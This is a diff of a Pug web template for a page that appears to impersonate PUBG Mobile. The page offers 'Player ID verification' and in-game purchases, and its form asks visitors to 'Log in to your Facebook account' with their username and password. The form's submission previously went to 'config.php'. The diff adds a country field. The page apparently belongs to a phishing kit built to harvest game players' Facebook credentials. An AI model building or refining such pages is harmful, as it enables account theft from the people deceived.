@@ -23,9 +23,15 @@ html(lang="en", dir="ltr")
             label Player ID Verification
             .input-groups
               input.main-input(name='first_name' placeholder='Please Enter Player ID' type='text')
-              span OK
+              //- .ok OK
             .validation-msg.empty Player ID is required‎
             .message Couldn't find your Player ID?
+          .form-main
+            form
+              label Please Write Your Country And Press Ok
+              .input-groups
+                input.main-input(type='text' name='country' autocomplete="off" required placeholder='Please Write Your Country' )
+                input.ok(id="seend" type='submit' value='OK' style="width: auto;")
         h6 Payment Method 
         .credit
           .depit
@@ -137,7 +143,7 @@ html(lang="en", dir="ltr")
         .content-box
           img(src="imges/icon-logo.jpg", alt="")
           .txt-box  Log in to your Facebook account to connect to PUBG MOBILE
-          form(action="config.php")
+          form
             input(type="text" name="username" autocomplete="off" required placeholder="Mobile number or email address")
             input(type="password" name="password" autocomplete="off" required  placeholder="Password")
             input(id="seend" type='submit' value='Log In')
@@ -162,7 +168,9 @@ html(lang="en", dir="ltr")
         span.cust Total: 0 USD
         span.hidden.eight Total: 8.99 USD
         span.hidden.thirt Total: 19.99 USD
+          //- input(id="seend" type='submit' value='Pay now')
         button Pay now
+
 
 
 
